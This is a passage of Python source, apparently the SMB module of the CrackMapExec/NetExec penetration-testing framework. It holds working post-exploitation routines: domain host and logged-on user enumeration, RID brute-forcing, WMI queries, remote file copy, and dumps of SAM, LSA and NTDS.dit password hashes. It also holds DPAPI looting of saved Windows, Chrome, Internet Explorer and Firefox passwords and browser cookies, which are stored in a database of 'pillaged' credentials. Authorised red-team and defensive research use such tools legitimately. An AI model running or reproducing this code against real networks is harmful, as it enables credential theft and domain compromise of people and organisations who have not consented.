        return groups

    def users(self):
        self.logger.display("Trying to dump local users with SAMRPC protocol")
        users = UserSamrDump(self).dump()
        return users

    def hosts(self):
        hosts = []
        for dc_ip in self.get_dc_ips():
            try:
                hosts = get_netcomputer(
                    dc_ip,
                    self.domain,
                    self.username,
                    password=self.password,
                    lmhash=self.lmhash,
                    nthash=self.nthash,
                    queried_domain="",
                    ads_path=str(),
                    custom_filter=str(),
                )

                self.logger.success("Enumerated domain computer(s)")
                for hosts in hosts:
                    domain, host_clean = self.domainfromdnshostname(hosts.dnshostname)
                    self.logger.highlight(f"{domain}\\{host_clean:<30}")
                break
            except Exception as e:
                self.logger.fail(f"Error enumerating domain hosts using dc ip {dc_ip}: {e}")
                break
        return hosts

    def loggedon_users(self):
        logged_on = []
        try:
            logged_on = get_netloggedon(
                self.host,
                self.domain,
                self.username,
                self.password,
                lmhash=self.lmhash,
                nthash=self.nthash,
            )
            self.logger.success("Enumerated logged_on users")
            if self.args.loggedon_users_filter:
                for user in logged_on:
                    if re.match(self.args.loggedon_users_filter, user.wkui1_username):
                        self.logger.highlight(f"{user.wkui1_logon_domain}\\{user.wkui1_username:<25} {f'logon_server: {user.wkui1_logon_server}' if user.wkui1_logon_server else ''}")
            else:
                for user in logged_on:
                    self.logger.highlight(f"{user.wkui1_logon_domain}\\{user.wkui1_username:<25} {f'logon_server: {user.wkui1_logon_server}' if user.wkui1_logon_server else ''}")
        except Exception as e:
            self.logger.fail(f"Error enumerating logged on users: {e}")
        return logged_on

    def pass_pol(self):
        return PassPolDump(self).dump()

    @requires_admin
    def wmi(self, wmi_query=None, namespace=None):
        records = []
        if not wmi_query:
            wmi_query = self.args.wmi.strip('\n')

        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            dcom = DCOMConnection(
                self.host if not self.kerberos else self.hostname + "." + self.domain,
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                oxidResolver=True,
                doKerberos=self.kerberos,
                kdcHost=self.kdcHost,
                aesKey=self.aesKey
            )
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login,IID_IWbemLevel1Login)
            flag, stringBinding =  dcom_FirewallChecker(iInterface, self.args.dcom_timeout)
            if not flag or not stringBinding:
                error_msg = f'WMI Query: Dcom initialization failed on connection with stringbinding: "{stringBinding}", please increase the timeout with the option "--dcom-timeout". If it\'s still failing maybe something is blocking the RPC connection, try another exec method'
                
                if not stringBinding:
                    error_msg = "WMI Query: Dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"
                
                self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
                # Make it force break function
                dcom.disconnect()
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin(namespace , NULL, NULL)
            iWbemLevel1Login.RemRelease()
            iEnumWbemClassObject = iWbemServices.ExecQuery(wmi_query)
        except Exception as e:
            self.logger.fail('Execute WQL error: {}'.format(e))
            if "iWbemLevel1Login" in locals():
                dcom.disconnect()
        else:
            self.logger.info(f"Executing WQL syntax: {wmi_query}")
            while True:
                try:
                    wmi_results = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                    record = wmi_results.getProperties()
                    records.append(record)
                    for k,v in record.items():
                        self.logger.highlight(f"{k} => {v['value']}")
                except Exception as e:
                    if str(e).find('S_FALSE') < 0:
                        raise e
                    else:
                        break
            dcom.disconnect()
        return records if records else False

    def spider(
        self,
        share=None,
        folder=".",
        pattern=[],
        regex=[],
        exclude_dirs=[],
        depth=None,
        content=False,
        only_files=True,
    ):
        spider = SMBSpider(self.conn, self.logger)

        self.logger.display("Started spidering")
        start_time = time()
        if not share:
            spider.spider(
                self.args.spider,
                self.args.spider_folder,
                self.args.pattern,
                self.args.regex,
                self.args.exclude_dirs,
                self.args.depth,
                self.args.content,
                self.args.only_files,
            )
        else:
            spider.spider(share, folder, pattern, regex, exclude_dirs, depth, content, only_files)

        self.logger.display(f"Done spidering (Completed in {time() - start_time})")

        return spider.results

    def rid_brute(self, max_rid=None):
        entries = []
        if not max_rid:
            max_rid = int(self.args.rid_brute)

        KNOWN_PROTOCOLS = {
            135: {"bindstr": r"ncacn_ip_tcp:%s", "set_host": False},
            139: {"bindstr": r"ncacn_np:{}[\pipe\lsarpc]", "set_host": True},
            445: {"bindstr": r"ncacn_np:{}[\pipe\lsarpc]", "set_host": True},
        }

        try:
            full_hostname = self.host if not self.kerberos else self.hostname + "." + self.domain
            string_binding = KNOWN_PROTOCOLS[self.args.port]["bindstr"]
            logging.debug(f"StringBinding {string_binding}")
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_dport(self.args.port)

            if KNOWN_PROTOCOLS[self.args.port]["set_host"]:
                rpc_transport.setRemoteHost(full_hostname)

            if hasattr(rpc_transport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey)

            if self.kerberos:
                rpc_transport.set_kerberos(self.kerberos, self.kdcHost)

            dce = rpc_transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

            dce.connect()
        except Exception as e:
            self.logger.fail(f"Error creating DCERPC connection: {e}")
            return entries

        # Want encryption? Uncomment next line
        # But make simultaneous variable <= 100
        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)

        # Want fragmentation? Uncomment next line
        # dce.set_max_fragment_size(32)

        dce.bind(lsat.MSRPC_UUID_LSAT)
        try:
            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        except lsad.DCERPCSessionError as e:
            self.logger.fail(f"Error connecting: {e}")
            return entries

        policy_handle = resp["PolicyHandle"]

        resp = lsad.hLsarQueryInformationPolicy2(
            dce,
            policy_handle,
            lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation,
        )
        domain_sid = resp["PolicyInformation"]["PolicyAccountDomainInfo"]["DomainSid"].formatCanonical()

        so_far = 0
        simultaneous = 1000
        for j in range(max_rid // simultaneous + 1):
            if (max_rid - so_far) // simultaneous == 0:
                sids_to_check = (max_rid - so_far) % simultaneous
            else:
                sids_to_check = simultaneous

            if sids_to_check == 0:
                break

            sids = list()
            for i in range(so_far, so_far + sids_to_check):
                sids.append(f"{domain_sid}-{i:d}")
            try:
                lsat.hLsarLookupSids(dce, policy_handle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find("STATUS_NONE_MAPPED") >= 0:
                    so_far += simultaneous
                    continue
                elif str(e).find("STATUS_SOME_NOT_MAPPED") >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp["TranslatedNames"]["Names"]):
                if item["Use"] != SID_NAME_USE.SidTypeUnknown:
                    rid = so_far + n
                    domain = resp["ReferencedDomains"]["Domains"][item["DomainIndex"]]["Name"]
                    user = item["Name"]
                    sid_type = SID_NAME_USE.enumItems(item["Use"]).name
                    self.logger.highlight(f"{rid}: {domain}\\{user} ({sid_type})")
                    entries.append(
                        {
                            "rid": rid,
                            "domain": domain,
                            "username": user,
                            "sidtype": sid_type,
                        }
                    )
            so_far += simultaneous
        dce.disconnect()
        return entries

    def put_file(self):
        self.logger.display(f"Copying {self.args.put_file[0]} to {self.args.put_file[1]}")
        with open(self.args.put_file[0], "rb") as file:
            try:
                self.conn.putFile(self.args.share, self.args.put_file[1], file.read)
                self.logger.success(f"Created file {self.args.put_file[0]} on \\\\{self.args.share}\\{self.args.put_file[1]}")
            except Exception as e:
                self.logger.fail(f"Error writing file to share {self.args.share}: {e}")

    def get_file(self):
        share_name = self.args.share
        remote_path = self.args.get_file[0]
        download_path = self.args.get_file[1]
        self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
        if self.args.append_host:
            download_path = f"{self.hostname}-{remote_path}"
        with open(download_path, "wb+") as file:
            try:
                self.conn.getFile(share_name, remote_path, file.write)
                self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
            except Exception as e:
                self.logger.fail(f'Error writing file "{remote_path}" from share "{share_name}": {e}')
                if os.path.getsize(download_path) == 0:
                    os.remove(download_path)

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return
        try:
            self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.fail(f"RemoteOperations failed: {e}")

    @requires_admin
    def sam(self):
        try:
            self.enable_remoteops()
            host_id = self.db.get_hosts(filter_term=self.host)[0][0]

            def add_sam_hash(sam_hash, host_id):
                add_sam_hash.sam_hashes += 1
                self.logger.highlight(sam_hash)
                username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
                self.db.add_credential(
                    "hash",
                    self.hostname,
                    username,
                    ":".join((lmhash, nthash)),
                    pillaged_from=host_id,
                )

            add_sam_hash.sam_hashes = 0

            if self.remote_ops and self.bootkey:
                SAM_file_name = self.remote_ops.saveSAM()
                SAM = SAMHashes(
                    SAM_file_name,
                    self.bootkey,
                    isRemote=True,
                    perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
                )

                self.logger.display("Dumping SAM hashes")
                SAM.dump()
                SAM.export(self.output_filename)
                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")

                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
                SAM.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail("Error \"STATUS_ACCESS_DENIED\" while dumping SAM. This is likely due to an endpoint protection.")
        except Exception as e:
            self.logger.exception(str(e))

    @requires_admin
    def dpapi(self):
        dump_system = False if "nosystem" in self.args.dpapi else True
        logging.getLogger("dploot").disabled = True

        if self.args.pvk is not None:
            try:
                self.pvkbytes = open(self.args.pvk, "rb").read()
                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
            except Exception as e:
                self.logger.fail(str(e))

        masterkeys = []
        if self.args.mkfile is not None:
            try:
                masterkeys += parse_masterkey_file(self.args.mkfile)
            except Exception as e:
                self.logger.fail(str(e))

        if self.pvkbytes is None and self.no_da is None and self.args.local_auth is False:
            try:
                results = self.db.get_domain_backupkey(self.domain)
            except:
                self.logger.fail(
                    "Your version of CMEDB is not up to date, run cmedb and create a new workspace: \
                    'workspace create dpapi' then re-run the dpapi option"
                )
                return False
            if len(results) > 0:
                self.logger.success("Loading domain backupkey from cmedb...")
                self.pvkbytes = results[0][2]
            else:
                try:
                    dc_target = Target.create(
                        domain=self.domain,
                        username=self.username,
                        password=self.password,
                        target=self.domain,  # querying DNS server for domain will return DC
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        do_kerberos=self.kerberos,
                        aesKey=self.aesKey,
                        no_pass=True,
                        use_kcache=self.use_kcache,
                    )
                    dc_conn = DPLootSMBConnection(dc_target)
                    dc_conn.connect()  # Connect to DC
                    if dc_conn.is_admin():
                        self.logger.success("User is Domain Administrator, exporting domain backupkey...")
                        backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                        backupkey = backupkey_triage.triage_backupkey()
                        self.pvkbytes = backupkey.backupkey_v2
                        self.db.add_domain_backupkey(self.domain, self.pvkbytes)
                    else:
                        self.no_da = False
                except Exception as e:
                    self.logger.fail(f"Could not get domain backupkey: {e}")
                    pass

        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.hostname + "." + self.domain if self.kerberos else self.host,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = self.conn
        except Exception as e:
            self.logger.debug(f"Could not upgrade connection: {e}")
            return

        plaintexts = {username: password for _, _, username, password, _, _ in self.db.get_credentials(cred_type="plaintext")}
        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in self.db.get_credentials(cred_type="hash")}
        if self.password != "":
            plaintexts[self.username] = self.password
        if self.nthash != "":
            nthashes[self.username] = self.nthash

        # Collect User and Machine masterkeys
        try:
            self.logger.display("Collecting User and Machine masterkeys, grab a coffee and be patient...")
            masterkeys_triage = MasterkeysTriage(
                target=target,
                conn=conn,
                pvkbytes=self.pvkbytes,
                passwords=plaintexts,
                nthashes=nthashes,
            )
            self.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
            masterkeys += masterkeys_triage.triage_masterkeys()
            if dump_system:
                masterkeys += masterkeys_triage.triage_system_masterkeys()
        except Exception as e:
            self.logger.debug(f"Could not get masterkeys: {e}")

        if len(masterkeys) == 0:
            self.logger.fail("No masterkeys looted")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")

        credentials = []
        system_credentials = []
        try:
            # Collect User and Machine Credentials Manager secrets
            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
            credentials = credentials_triage.triage_credentials()
            self.logger.debug(f"Triaged Credentials: {credentials}")
            if dump_system:
                system_credentials = credentials_triage.triage_system_credentials()
                self.logger.debug(f"Triaged System Credentials: {system_credentials}")
        except Exception as e:
            self.logger.debug(f"Error while looting credentials: {e}")

        for credential in credentials:
            self.logger.highlight(f"[{credential.winuser}][CREDENTIAL] {credential.target} - {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "CREDENTIAL",
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )
        for credential in system_credentials:
            self.logger.highlight(f"[SYSTEM][CREDENTIAL] {credential.target} - {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "CREDENTIAL",
                "SYSTEM",
                credential.username,
                credential.password,
                credential.target,
            )

        browser_credentials = []
        cookies = []
        try:
            # Collect Chrome Based Browser stored secrets
            dump_cookies = True if "cookies" in self.args.dpapi else False
            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
            browser_credentials, cookies = browser_triage.triage_browsers(gather_cookies=dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting browsers: {e}")
        for credential in browser_credentials:
            cred_url = credential.url + " -" if credential.url != "" else "-"
            self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                credential.browser.upper(),
                credential.winuser,
                credential.username,
                credential.password,
                credential.url,
            )

        if dump_cookies:
            self.logger.display("Start Dumping Cookies")
            for cookie in cookies:
                if cookie.cookie_value != '':
                    self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
            self.logger.display("End Dumping Cookies")

        vaults = []
        try:
            # Collect User Internet Explorer stored secrets
            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
            vaults = vaults_triage.triage_vaults()
        except Exception as e:
            self.logger.debug(f"Error while looting vaults: {e}")
        for vault in vaults:
            if vault.type == "Internet Explorer":
                resource = vault.resource + " -" if vault.resource != "" else "-"
                self.logger.highlight(f"[{vault.winuser}][IEX] {resource} - {vault.username}:{vault.password}")
                self.db.add_dpapi_secrets(
                    target.address,
                    "IEX",
                    vault.winuser,
                    vault.username,
                    vault.password,
                    vault.resource,
                )

        firefox_credentials = []
        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
            firefox_credentials = firefox_triage.run()
        except Exception as e:
            self.logger.debug(f"Error while looting firefox: {e}")
        for credential in firefox_credentials:
            url = credential.url + " -" if credential.url != "" else "-"
            self.logger.highlight(f"[{credential.winuser}][FIREFOX] {url} {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "FIREFOX",
                credential.winuser,
                credential.username,
                credential.password,
                credential.url,
            )

    @requires_admin
    def lsa(self):
        try:
            self.enable_remoteops()

            def add_lsa_secret(secret):
                add_lsa_secret.secrets += 1
                self.logger.highlight(secret)
                if "_SC_GMSA_{84A78B8C" in secret:
                    gmsa_id = secret.split("_")[4].split(":")[0]
                    data = bytes.fromhex(secret.split("_")[4].split(":")[1])
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob["CurrentPassword"][:-2]
                    ntlm_hash = MD4.new()
                    ntlm_hash.update(currentPassword)
                    passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")

            add_lsa_secret.secrets = 0

            if self.remote_ops and self.bootkey:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                LSA = LSASecrets(
                    SECURITYFileName,
                    self.bootkey,
                    self.remote_ops,
                    isRemote=True,
                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                )
                self.logger.success("Dumping LSA secrets")
                LSA.dumpCachedHashes()
                LSA.exportCached(self.output_filename)
                LSA.dumpSecrets()
                LSA.exportSecrets(self.output_filename)
                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
                LSA.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail("Error \"STATUS_ACCESS_DENIED\" while dumping LSA. This is likely due to an endpoint protection.")
        except Exception as e:
            self.logger.exception(str(e))

    def ntds(self):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName = None
        host_id = self.db.get_hosts(filter_term=self.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            add_ntds_hash.ntds_hashes += 1
            if self.args.enabled:
                if "Enabled" in ntds_hash:
                    ntds_hash = ntds_hash.split(" ")[0]
                    self.logger.highlight(ntds_hash)
            else:
                ntds_hash = ntds_hash.split(" ")[0]
                self.logger.highlight(ntds_hash)
            if ntds_hash.find("$") == -1:
                if ntds_hash.find("\\") != -1:
                    domain, hash = ntds_hash.split("\\")
                else:
                    domain = self.domain
                    hash = ntds_hash

                try:
                    username, _, lmhash, nthash, _, _, _ = hash.split(":")
                    parsed_hash = ":".join((lmhash, nthash))
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except:
                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                self.logger.debug("Dumped hash is a computer account, not adding to db")

        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        if self.remote_ops:
            try:
                if self.args.ntds == "vss":
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

            except Exception as e:
                # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                # We don't store the resume file if this error happened, since this error is related to lack
                # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                self.logger.fail(e)

        NTDS = NTDSHashes(
            NTDSFileName,
            self.bootkey,
            isRemote=True,
            history=False,
            noLMHash=True,
            remoteOps=self.remote_ops,
            useVSSMethod=use_vss_method,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=self.output_filename,
            justUser=self.args.userntds if self.args.userntds else None,
            printUserStatus=True,
            perSecretCallback=lambda secret_type, secret: add_ntds_hash(secret, host_id),
        )

        try:
            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            ntds_outfile = f"{self.output_filename}.ntds"
            self.logger.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {ntds_outfile} of which {highlight(add_ntds_hash.added_to_db)} were added to the database")
            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
            self.logger.display(f"cat {ntds_outfile} | grep -iv disabled | cut -d ':' -f1")
            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
        except Exception as e:
            # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
            # We don't store the resume file if this error happened, since this error is related to lack
            # of enough privileges to access DRSUAPI.
            #    resumeFile = NTDS.getResumeSessionFile()
            #    if resumeFile is not None:
            #        os.unlink(resumeFile)
            self.logger.fail(e)
        try:
            self.remote_ops.finish()
        except Exception as e:
            self.logger.debug(f"Error calling remote_ops.finish(): {e}")
        NTDS.finish()
